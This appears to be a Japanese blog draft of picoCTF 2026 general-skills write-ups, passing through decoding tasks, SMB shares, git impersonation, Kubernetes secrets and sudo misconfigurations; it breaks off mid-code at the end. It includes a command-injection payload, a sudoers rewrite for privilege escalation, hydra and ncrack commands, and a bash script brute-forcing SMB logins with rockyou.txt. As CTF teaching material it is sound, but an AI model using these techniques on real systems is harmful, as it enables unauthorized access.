+++
title = 'General_skills'
date = 2026-10-06T14:34:59+09:00
draft = true
+++

# SUDO MAKE ME A SANDWICH

問題名より、明らかに`sudo`で実行できるコマンドがあるので、`sudo -l`でそのコマンドを確認してflagゲット。

```
ctf-player@challenge:~$ ls
flag.txt
ctf-player@challenge:~$ sudo -l
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
ctf-player@challenge:~$ sudo /bin/emacs flag.txt

picoCTF{ju57_5ud0_17_cce7a3f7}
```

# Piece by Piece

まず問題文に書かれている通り、ヒントのテキストファイルを見ていきます。

```
ctf-player@pico-chall$ cat instructions.txt
Hint:

- The flag is split into multiple parts as a zipped file.
- Use Linux commands to combine the parts into one file.
- The zip file is password protected. Use this "supersecret" password to extract the zip file.
- After unzipping, check the extracted text file for the flag.
```
なので、`cat`を用いてそれぞれを結合していきます。

:::note info
`cat`の語源は「con**cat**enate」であり、本来ファイルを連結するためのコマンドです。
:::

https://academy.gmocloud.com/wp/lesson/20191111/8091

```
ctf-player@pico-chall$ cat part_* > combined.zip
```
:::note info
Linuxのシェルは`*`を展開するときに原則**アルファベット順**で展開します。
:::

あとは`supersecret`というパスワードを用いて`unzip`すればflagゲットです。

```
ctf-player@pico-chall$ unzip -P supersecret combined.zip
Archive:  combined.zip
 extracting: flag.txt                
ctf-player@pico-chall$ cat flag.txt
picoCTF{z1p_and_spl1t_f1l3s_4r3_fun_27804340}
```

# bytemancy 0

ソースコードを見ていきます。

```python
while(True):
  try:
    print('⊹──────[ BYTEMANCY-0 ]──────⊹')
    print("☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐")
    print()
    print('Send me ASCII DECIMAL 101, 101, 101, side-by-side, no space.')
    print()
    print("☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐")
    print('⊹─────────────⟡─────────────⊹')
    user_input = input('==> ')
    if user_input == "\x65\x65\x65":
      print(open("./flag.txt", "r").read())
      break
    else:
      print("That wasn't it. I got: " + str(user_input))
      print()
      print()
      print()
  except Exception as e:
    print(e)
    break
```

ソースコードから、**ユーザーの入力が`\x65\x65\x65`であればflagが獲得できそう**です。
`\x65`は`e`のことであるため、`e`を3回入力すればflagゲットです。

https://www3.nit.ac.jp/~tamura/ex2/ascii.html

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ nc candy-mountain.picoctf.net 63916
⊹──────[ BYTEMANCY-0 ]──────⊹
☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐

Send me ASCII DECIMAL 101, 101, 101, side-by-side, no space.

☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐
⊹─────────────⟡─────────────⊹
==> eee
picoCTF{pr1n74813_ch4r5_2f7a75e5}
```

# Printer Shares

問題文のヒントを見ると、「SMBで接続してみろ」という風なことが書いてあったので、`smbclient`で接続していきます。
まずは`-L`でリストアップを行います。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ smbclient -L //mysterious-sea.picoctf.net/ -p 63915 -N

        Sharename       Type      Comment
        ---------       ----      -------
        shares          Disk      Public Share With Guests
        IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to mysterious-sea.picoctf.net failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

**`shares`というのが明らかに怪しい**ので、`shares`に接続していきます。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ smbclient //mysterious-sea.picoctf.net/shares -p 63915 -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Mar  7 05:25:41 2026
  ..                                  D        0  Sat Mar  7 05:25:41 2026
  dummy.txt                           N     1142  Thu Feb  5 06:22:17 2026
  flag.txt                            N       37  Sat Mar  7 05:25:41 2026

                65536 blocks of size 1024. 60000 blocks available
```

`get`で`flag.txt`を取得してflagゲットです。

```
smb: \> get flag.txt
getting file \flag.txt of size 37 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
```

```
picoCTF{5mb_pr1nter_5h4re5_2f61915b}
```

# MY GIT

問題の指示に従った後、`README.md`を見ていきます。

```
┌──(kali㉿kali)-[~/PicoCTF2026/challenge]
└─$ cat README.md
# MyGit

### If you want the flag, make sure to push the flag!

Only flag.txt pushed by ```root:root@picoctf``` will be updated with the flag.

GOOD LUCK!
```

これは、**`root`という`username`で、かつメアドが`root@picoctf`である人によってpushされた`flag.txt`のみが、flagとともにアップデートされる**ということです。
なので以下のように`user.name`と`user.email`を設定します。

```
┌──(kali㉿kali)-[~/PicoCTF2026/challenge]
└─$ git config user.name "root"                                        
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/PicoCTF2026/challenge]
└─$ git config user.email "root@picoctf"
                                                                                                                                                                                
```

`flag.txt`を作成します。

```
┌──(kali㉿kali)-[~/PicoCTF2026/challenge]
└─$ echo 'dummy' > flag.txt                                                                                     
                                                                                                                                                                                
```

あとは`flag.txt`をステージして、コミットしてプッシュするとflagゲットです。

```
┌──(kali㉿kali)-[~/PicoCTF2026/challenge]
└─$ git add flag.txt     
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/PicoCTF2026/challenge]
└─$ git commit -m "add flag.txt"
[master f8f6859] add flag.txt
 1 file changed, 1 insertion(+)
 create mode 100644 flag.txt
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/PicoCTF2026/challenge]
└─$ git push
[...]
remote: Author matched and flag.txt found in commit...
remote: Congratulations! You have successfully impersonated the root user
remote: Here's your flag: picoCTF{1mp3rs0n4t4_g17_345y_05f9a904}
[...]
```

# Password Profiler

まずは与えられている`userinfo.txt`を見ていきます。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ cat userinfo.txt     
First Name: Alice
Surname: Johnson
Nickname: AJ
Birthdate: 15-07-1990
Partner's Name: Bob
Child's Name: Charlie
```

そして、ヒントにも書いてある通り`cupp`というツールを用いてパスワードリストを作成していきます。`-i`オプションを用いてインタラクティブモードで実行します。

https://github.com/mebus/cupp

パスワードリストが作成できたら、リストの名前を`passwords.txt`に変更します。(`check_password.py`に合わせるため)

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ mv alice.txt passwords.txt 
```

あとは`check_password.py`を実行してflagゲットです。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ python3 check_password.py 
Password found: picoCTF{Aj_15901990}
```

# KSECRETS

まずは与えられている`kubeconfig.yaml`を確認し、接続先のサーバー情報をCTF側の指定されたURL（今回は`https://green-hill.picoctf.net:59235`など）に書き換えます。

```yaml
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: LS0t...
    server: https://green-hill.picoctf.net:59235 
  name: default
contexts:
[...]
```

準備ができたら、`kubectl`コマンドを使ってKubernetesクラスタ内の情報を探っていきます。まずはデフォルトの名前空間（namespace）にあるPodやSecretを探しますが、何も見つかりません。

```
┌──(kali㉿kali)-[~/Downloads]
└─$ kubectl --kubeconfig=kubeconfig.yaml --insecure-skip-tls-verify=true get pods
No resources found in default namespace.
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ kubectl --kubeconfig=kubeconfig.yaml --insecure-skip-tls-verify=true get secrets 
No resources found in default namespace.
                                                                                                                                                                                                                                            
```

デフォルトの場所にないため、`-A`（`--all-namespaces`）オプションをつけて、**すべての名前空間のSecretを検索します**。

```
┌──(kali㉿kali)-[~/Downloads]
└─$ kubectl --kubeconfig=kubeconfig.yaml --insecure-skip-tls-verify=true get secrets -A

NAMESPACE     NAME                       TYPE                               DATA   AGE
kube-system   chart-values-traefik       helmcharts.helm.cattle.io/values   1      5m11s
kube-system   chart-values-traefik-crd   helmcharts.helm.cattle.io/values   0      5m11s
kube-system   k3s-serving                kubernetes.io/tls                  2      5m15s
picoctf       ctf-secret
```

**`picoctf`という名前空間に、怪しい`ctf-secret`が存在する**ことが確認できました。
次に、このSecretの中身を`-o yaml`オプションで出力して確認します。

```
┌──(kali㉿kali)-[~/Downloads]
└─$ kubectl --kubeconfig=kubeconfig.yaml --insecure-skip-tls-verify=true get secret ctf-secret -n picoctf -o yaml
apiVersion: v1
data:
  flag: cGljb0NURntrczNjcjM3NV80MW43X3M0ZjNfNDAxM2EzNjh9Cg==
[...]
```

`flag`の値がBase64でエンコードされていることがわかります。cyberchefでも`echo <> | base64 -d`でもよいので、デコードするとflagゲットです。

```
picoCTF{ks3cr375_41n7_s4f3_4013a368}
```

## 補足

この問題を解くために行った操作が、ぶっちゃけ何をしているかよくわからなかったのでAIに聞くなりして調べてみました。

1. Kubernetesとは？
    複数のコンテナを管理するための巨大なシステムです。`kubectl`は、そのシステムを外部から操縦するためのコマンドラインツールです。

2. `kubeconfig.yaml`の役割
    「どのサーバーに、どの証明書でアクセスするか」が書かれた入場券兼設定ファイルです。これを指定することで、ローカルのパソコンから遠隔のCTFサーバーを操縦できるようになりました。

3. 名前空間（Namespace）と`-A`の意味
    Kubernetesの中は「Namespace」という部屋で区切られています。最初はデフォルトの部屋を探して空振りしたので、`-A`オプションを使って、隠された`picoctf`という部屋を見つけ出しました。

4. SecretとBase64の罠
    `get secret`は、本来パスワードやAPIキーなどの機密情報を保存する場所を見るコマンドです。しかし、Kubernetesの初期設定では暗号化ではなく、**単に文字を別の文字に置き換えるだけの「Base64エンコード」で保存されているだけ**です。(フラグの中身もKubernetesのSecretは安全ではないとなっています)

# ping-cmd


まずはサーバーに接続してみます。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ nc mysterious-sea.picoctf.net 49412               
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'):
```

`We have tight security because we only allow '8.8.8.8'`と書かれていることから、**入力値に`8.8.8.8`が含まれる必要があると推測できます。**
また、裏ではおそらく`ping <user_input>`という風に組み立てられて実行されていると推測できます。

**Linuxのシェルでは`command1; command2`と書くと「`command1`が終わった後に `command2`を実行する」という意味になります。**

なので、まずは`ls -la`でディレクトリの中身を確認します。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ nc mysterious-sea.picoctf.net 49412
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; ls -la
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.51 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.48 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 9.484/9.498/9.513/0.014 ms
total 20
drwxr-x--- 1 ctf-player ctf-player   23 Mar  7 11:54 .
drwxr-xr-x 1 root       root         24 Mar  7 11:54 ..
-rw-r--r-- 1 ctf-player ctf-player  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 ctf-player ctf-player 3771 Jan  6  2022 .bashrc
-rw-r--r-- 1 ctf-player ctf-player  807 Jan  6  2022 .profile
-r-------- 1 ctf-player ctf-player   49 Mar  6 20:19 flag.txt
-r-x------ 1 ctf-player ctf-player  149 Mar  7 11:53 script.sh
```

`ping 8.8.8.8`が実行された直後に`ls -la`が実行され、カレントディレクトリに`flag.txt`が存在することが確認できました。
ちなみに`whoami`を実行すると`ctf-player`というユーザーで動いていることもわかります。

最後に、同じ手法で`cat flag.txt`をくっつけて実行してflagゲットです。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ nc mysterious-sea.picoctf.net 49412
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=8.47 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=8.50 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 8.469/8.485/8.501/0.016 ms
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_8555bda7}
```

# bytemancy 1

先ほどのbytemancy 0の続編のような感じの問題です。
配布されている`app.py`の中身を確認します。

```python
while(True):
  try:
    print('⊹──────[ BYTEMANCY-1 ]──────⊹')
    print("☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐")
    print()
    print('Send me ASCII DECIMAL 101 1751 times, side-by-side, no space.')
    print()
    print("☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐")
    print('⊹─────────────⟡─────────────⊹')
    user_input = input('==> ')
    if user_input == "\x65"*1751:
      print(open("./flag.txt", "r").read())
      break
    else:
      print("That wasn't it. I got: " + str(user_input))
      print()
      print()
      print()
  except Exception as e:
    print(e)
    break
```

ソースコードの中身より、**`e`を1751回連続で入力する**とflagが獲得できそうです。

手作業で`e`を1751回入力するのは骨が折れるため、Pythonのワンライナーを使って自動生成します。
Pythonでは、`'e' * 1751`と書くだけで文字を簡単に反復させることができます。

次に、このPythonが出力した大量の`e`を、そのまま`nc`コマンドで接続したサーバーへと流し込みます。ここで使うのが**パイプ**(`|`)です。

:::note info
パイプ(`|`)とは、Linuxコマンドを使って、左側のコマンドで出力された内容を、そのまま右側のコマンドへ橋渡しするための機能です。
今回の構成をイメージで表すと、「データを出すツール（Python） ｜ データを受け取って通信するツール（nc）」 という役割分担になります。
:::

これらを組み合わせて以下のコマンドを実行することで、flagを獲得することができました。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ python3 -c "print('e' * 1751)" | nc foggy-cliff.picoctf.net 50844
⊹──────[ BYTEMANCY-1 ]──────⊹
☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐

Send me ASCII DECIMAL 101 1751 times, side-by-side, no space.

☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐
⊹─────────────⟡─────────────⊹
==> picoCTF{h0w_m4ny_e's???_e0d51f4b}
```

# Undo

サーバーに接続すると以下のように表示されます。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ nc foggy-cliff.picoctf.net 51668
===Welcome to the Text Transformations Challenge!===

Your goal: step by step, recover the original flag.
At each step, you'll see the transformed flag and a hint.
Enter the correct Linux command to reverse the last transformation.

--- Step 1 ---
Current flag: KTZvNHFycnE4LWZhMDFnQHplMHNmYTRlRy1nazNnLXRhMWZlcmlyRShTR1BicHZj
Hint: Base64 encoded the string.
Enter the Linux command to reverse it: 
```

これは**明らかにbase64でエンコードされた文字列**なので、試しに`base64`と入力してみました。すると以下のように表示されました。

```
Enter the Linux command to reverse it: base64
Incorrect. Try again.
Output: S1Radk5IRnljbkU0TFdaaE1ERm5RSHBsTUhObVlUUmxSeTFuYXpObkxYUmhNV1psY21seVJTaFRS
MUJpY0haag==
Hint: Try reversing: base64
```

このヒントを見るに、文字列をデコードする必要があると感じたので。`base64 -d`と入力してみました。すると以下のように表示されて、Step 1は成功しました。

```
Enter the Linux command to reverse it: base64 -d
Correct!

--- Step 2 ---
Current flag: )6o4qrrq8-fa01g@ze0sfa4eG-gk3g-ta1ferirE(SGPbpvc
Hint: Reversed the text.
Enter the Linux command to reverse it:
```

次はStep 2で、ヒントには「テキストが反転されている」と書かれているため、文字列を後ろからひっくり返すLinuxコマンドである`rev`を入力すると成功しました。

```
Enter the Linux command to reverse it: rev
Correct!

--- Step 3 ---
Current flag: cvpbPGS(Eriref1at-g3kg-Ge4afs0ez@g10af-8qrrq4o6)
Hint: Replaced underscores with dashes.
Enter the Linux command to reverse it:
```

次はStep 3です。問題文にも添付されていたヒントを参考に、`tr`というコマンドを入力してみました。すると以下のようになり、失敗しました。

```
Enter the Linux command to reverse it: tr "-" "`"
Incorrect. Try again.
Output: cvpbPGS(Eriref1at`g3kg`Ge4afs0ez@g10af`8qrrq4o6)
Hint: Try reversing: tr '_' '-'
```

`tr '_' '-'`をそのまま入力してもダメだったので、Hintにも出ている通り`'_'`と`'-'`を逆の順番で入力すると成功しました。

```
Enter the Linux command to reverse it: tr '-' '_'
Correct!

--- Step 4 ---
Current flag: cvpbPGS(Eriref1at_g3kg_Ge4afs0ez@g10af_8qrrq4o6)
Hint: Replaced curly braces with parentheses.
Enter the Linux command to reverse it:
```

次はStep 4です。これも一度わざと間違えてみたところ、`Hint: Try reversing: tr '{}' '()'`と表示されたので、`tr '()' '{}'`と入力することで成功しました。

```
Enter the Linux command to reverse it: tr '()' '{}'
Correct!

--- Step 5 ---
Current flag: cvpbPGS{Eriref1at_g3kg_Ge4afs0ez@g10af_8qrrq4o6}
Hint: Applied ROT13 to letters.
Enter the Linux command to reverse it: 
```

次はStep 5です。これも一度わざと間違えてみたところ、`Hint: Try reversing: tr 'a-zA-Z' 'n-za-mN-ZA-M'`と表示されたので、`tr 'n-za-mN-ZA-M' 'a-zA-Z'`と入力することでflagを獲得することができました。

```
--- Step 5 ---
Current flag: cvpbPGS{Eriref1at_g3kg_Ge4afs0ez@g10af_8qrrq4o6}
Hint: Applied ROT13 to letters.
Enter the Linux command to reverse it: tr
Incorrect. Try again.
Output: [Error] Invalid tr usage. Example: tr 'a-z' 'n-za-m'
Hint: Try reversing: tr 'a-zA-Z' 'n-za-mN-ZA-M'

Enter the Linux command to reverse it: tr 'n-za-mN-ZA-M' 'a-zA-Z'
Correct!

Congratulations! You've recovered the original flag:
>>> picoCTF{Revers1ng_t3xt_Tr4nsf0rm@t10ns_8deed4b6}
```

# MultiCode

問題を見ると、暗号文が渡されています。（ちなみに暗号文をメモするのを忘れてしまっていたので、この問題は考え方と最後のflagだけ記述しておきます...。）

1. まず、最初の暗号文の末尾に`=`があったので、これは**Base64**エンコードであると推測しました。CyberChefで`From Base64`を適用します。

2. Base64を解除して出てきた文字列を見ると、数字とアルファベットのaからfまでしか使われていませんでした。**これは16進数（Hex）の特徴です。**続けてレシピに`From Hex`を追加します。

3. Hexを解除すると、今度は`%7B`や`%5F`のような、`%`と数字が組み合わさった文字列が出てきます。これはWebのURLなどで使われる**URLエンコードです。**レシピに`URL Decode`を追加します。

4. URLデコードをすると、flagのフォーマットに近い文字列が現れました。ヒントに記載されていた暗号化方式の中で、残っているのは**ROT13**のみであるため、最後のレシピとして`ROT13`を追加します。

https://gchq.github.io/CyberChef/

この順番でデータのパイプラインを通すことで、見事に元の文字列が復元されました！

**Flag:** `picoCTF{nested_enc0ding_1d75be63}`

# bytemancy 2

まずはソースコードを見ていきます。

```python
import sys

while(True):
  try:
    print('⊹──────[ BYTEMANCY-2 ]──────⊹')
    print("☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐")
    print()
    print('Send me the HEX BYTE 0xFF 3 times, side-by-side, no space.')
    print()
    print("☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐")
    print('⊹─────────────⟡─────────────⊹')
    print('==> ', end='', flush=True)
    user_input = sys.stdin.buffer.readline().rstrip(b"\n")
    if user_input == b"\xff\xff\xff":
      print(open("./flag.txt", "r").read())
      break
    else:
      print("That wasn't it. I got: " + str(user_input))
      print()
      print()
      print()
  except Exception as e:
    print(e)
    break
```

どうやら`\xFF`を3回送る必要がありそうです。`\xFF`はアルファベットとしてキーボードから打つことができないので、Pythonを用いてバイトデータを出力し、パイプ(`|`)で`nc`に流し込みます。
前回の`print()`関数は勝手に文字コードを変換してしまうため、今回は生のデータをそのまま出力できる`sys.stdout.buffer.write()`を使います。
まずは指示通りに`b'\xff\xff\xff'`を送ってみました。

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -c "import sys; sys.stdout.buffer.write(b'\xff\xff\xff')" | nc lonely-island.picoctf.net 59116
⊹──────[ BYTEMANCY-2 ]──────⊹
☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐

Send me the HEX BYTE 0xFF 3 times, side-by-side, no space.

☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐
⊹─────────────⟡─────────────⊹
==> 
```

しかし、ここでプログラムが止まってしまいました。原因解明のためにソースコードを見てみると、以下の部分に原因がありました。

```
user_input = sys.stdin.buffer.readline().rstrip(b"\n")
```

:::note info
サーバーは`readline()`という関数を使って私たちの入力を受け取っています。
この関数は今回の場合、「改行コード（`\n`）が送られてくるまで、ずっと入力を待ち続ける」という性質を持っています。
最初のコマンドでは`0xFF`を3つ送っただけで、エンターキーに相当する`\n`を送っていなかったため、サーバー側はずっと待ち続けていました。
:::

なので、以下のようにコマンドを修正することでflagが獲得できました。

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -c "import sys; sys.stdout.buffer.write(b'\xff\xff\xff\n')" | nc lonely-island.picoctf.net 59116
⊹──────[ BYTEMANCY-2 ]──────⊹
☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐

Send me the HEX BYTE 0xFF 3 times, side-by-side, no space.

☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐
⊹─────────────⟡─────────────⊹
==> picoCTF{3ff5_4_d4yz_9a6da265}
```

# Printer Shares 2

まずは「Printer Shares」の時と同様、`smbclient`を用いてターゲットサーバーにどのような共有フォルダが存在するかをリストアップします。
パスワード無しで接続を試みるため、`-N`オプションをつけます。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ smbclient -L //green-hill.picoctf.net -p 55477 -N

        Sharename       Type      Comment
        ---------       ----      -------
        shares          Disk      Public Share With Guests
        secure-shares   Disk      Printer for internal usage only
        IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to green-hill.picoctf.net failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

誰でもアクセスできそうな`shares`と、内部用の`secure-shares`が見つかりました。

まずは`shares`に接続し、中身を確認します。`secure-shares`にもアクセスすることを試みましたが、`tree connect failed: NT_STATUS_ACCESS_DENIED`と表示されました。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ smbclient //green-hill.picoctf.net/shares -p 55477 -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar 10 06:29:06 2026
  ..                                  D        0  Tue Mar 10 06:29:06 2026
  content.txt                         N     1107  Thu Feb  5 06:22:17 2026
  kafka.txt                           N     1080  Thu Feb  5 06:22:17 2026
  notification.txt                    N      260  Thu Feb  5 06:22:17 2026

                65536 blocks of size 1024. 59892 blocks available
smb: \> get notification.txt
getting file \notification.txt of size 260 as notification.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> get kafka.txt
getting file \kafka.txt of size 1080 as kafka.txt (1.3 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \> get content.txt
getting file \content.txt of size 1107 as content.txt (1.3 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \> exit
```

`content.txt`と`kafka.txt`はダミーでしたが、`notification.txt`を見てみると決定的なヒントがありました。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ cat notification.txt 
Hi Joe,

We’ve identified a vulnerability in this printer. Until the issue is resolved, please use an alternative printer.

If you have never logged into the printer before, please note that the default password is currently in use.

Best,
The Operator Team
```

**Joeというユーザーが、デフォルトのパスワードを使っていることが分かります。なので、Joeのパスワードをクラックし、`secure-shares`にアクセスすることを試みます。**

なので、`hydra`や`ncrack`を用いて辞書攻撃を試みました。しかし、サーバー側のSMBバージョンの仕様やCTF環境の制限により、どちらのツールもエラーやフリーズで機能しませんでした。

```
# Hydraでの試行
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ hydra -l joe -P /usr/share/wordlists/rockyou.txt -s 50988 green-hill.picoctf.net smb
[...]
[ERROR] target smb://green-hill.picoctf.net:50988/ does not support SMBv1

# Ncrackでの試行（フリーズして進まない）
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ ncrack -p smb:61513 --user joe -P /usr/share/wordlists/rockyou.txt green-hill.picoctf.net

Starting Ncrack 0.7 ( http://ncrack.org ) at 2026-03-11 02:21 JST
Stats: 0:03:08 elapsed; 0 services completed (1 total)
Rate: 0.00; Found: 0; About 0.00% done
```

既存のツールが使えないので、`smbclient`を直接ループさせるシェルスクリプトを作成しました。

```Bash
#!/bin/bash

# 設定項目
WORDLIST="/usr/share/wordlists/rockyou.txt"
USER="joe"
PORT="65448"
TARGET="//green-hill.picoctf.net/secure-shares"

# 全行数を取得（進捗計算用）
TOTAL_LINES=$(wc -l < "$WORDLIST")
CURRENT_LINE=0

echo "[*] Starting brute force against $TARGET for user $USER..."
echo "[*] Total passwords to try: $TOTAL_LINES"

while IFS= read -r password || [ -n "$password" ]; do
  CURRENT_LINE=$((CURRENT_LINE + 1))

  # 毎回表示すると画面描画で処理が遅くなるため、100回ごとに進捗を上書き表示
  if [ $((CURRENT_LINE % 100)) -eq 0 ]; then
    echo -ne "\r[*] Progress: $CURRENT_LINE / $TOTAL_LINES (Trying: $password)     "
  fi

  # smbclientでログイン試行
  smbclient "$TARGET" -p "$PORT" -U "$USER%$password" -c 'ls' >/dev/null 2>&1

  # 終了コードが0（成功）ならループを抜ける
  if [ $? -eq 0 ]; then
    echo -e "\n\n[+] SUCCESS! Password Found: $password"
    break
  fi
done < "$WORDLIST"
```

:::note info
`smbclient`のコマンドに`-c 'ls' >/dev/null 2>&1`をつけている理由は、`-c`オプションを使うと、**ログインしたら、指定したコマンドを1回だけ実行して、処理が終わると自動的に終了する**という風にすることができるからです。
これにより、スクリプトがフリーズすることなく、次のパスワードの試行へスムーズに移ることができます。
:::

これを実行すると、見事にパスワードを特定できました！

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ nano script.sh 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ ./script.sh 
[*] Starting brute force against //green-hill.picoctf.net/secure-shares for user joe...
[*] Total passwords to try: 14344392
[*] Progress: 400 / 14344392 (Trying: dolphins)      

[+] SUCCESS! Password Found: popcorn
```

特定したパスワードを使って、`secure-shares`にログインします。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ smbclient //green-hill.picoctf.net/secure-shares -p 65448 -U joe
Password for [WORKGROUP\joe]:
smb: \> ls
  .                                   D        0  Tue Mar 10 06:29:14 2026
  ..                                  D        0  Tue Mar 10 06:29:14 2026
  flag.txt                            N       44  Tue Mar 10 06:29:14 2026

                65536 blocks of size 1024. 59580 blocks available
smb: \> get flag.txt
getting file \flag.txt of size 44 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> exit
```

無事にログインでき、flagを獲得できました！

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ cat flag.txt      
picoCTF{5mb_pr1nter_5h4re5_5ecure_d5e6bb0b}
```

# ABSOLUTE NANO

問題名からして、**明らかに`nano`というコマンドが`sudo`で実行できそうです。**なので`sudo -l`を実行します。

```
ctf-player@challenge:~$ sudo -l
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
ctf-player@challenge:~$ sudo /bin/nano /etc/sudoers
```

`nano`で`/etc/sudoers`が編集できます。なので、`sudo /bin/nano /etc/sudoers`を実行し、ファイルを直接書き換えます。

```
[...]

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
ctf-player ALL=(ALL) NOPASSWD: /bin/nano /etc/sudoers

```

ここで、**`ctf-player`を`root`と同様に`ALL=(ALL:ALL) ALL`にします。**そうすることで、どのコマンドも`sudo`で実行できるようになります。

```
変更前：
ctf-player ALL=(ALL) NOPASSWD: /bin/nano /etc/sudoers

変更後：
ctf-player ALL=(ALL:ALL) ALL
```

なので、`sudo cat flag.txt`を実行することができるようになり、flagを獲得することができました。

```
ctf-player@challenge:~$ sudo cat flag.txt
picoCTF{n4n0_411_7h3_w4y_6a5c67f2}
```

# Failure Failure

まずは配布されたソースコードを見ていきます。`app.py`は以下の通りです。

```python
from flask import Flask, render_template
from dotenv import load_dotenv
from flask_limiter import Limiter
import os

load_dotenv()

app = Flask(__name__)

# Custom key function for global rate limiting
def global_rate_limit_key():
    return "global"

# Initialize rate limiter with global key function
limiter = Limiter(
    key_func=global_rate_limit_key,
